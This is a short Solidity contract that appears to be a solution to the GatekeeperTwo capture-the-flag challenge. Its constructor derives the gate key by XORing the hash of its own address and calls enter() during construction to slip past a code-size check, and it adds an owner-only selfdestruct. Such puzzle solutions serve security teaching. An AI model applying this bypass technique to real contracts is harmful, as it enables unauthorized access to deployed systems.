// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Trespasser2 {
  address public immutable owner;
  IGatekeeperTwo public immutable gatekeeper;

  constructor (address _gatekeeper) {
    owner = msg.sender;
    gatekeeper = IGatekeeperTwo(_gatekeeper);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    bool entered = gatekeeper.enter(key);
    require(entered == true, "ERR_NOT_ENTERED");
  }

  modifier onlyOwner {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  function destroy() public onlyOwner {
    selfdestruct(payable(owner));
  }
}

interface IGatekeeperTwo {
  function entrant() external returns (address);
  function enter(bytes8 _gateKey) external returns (bool);
}
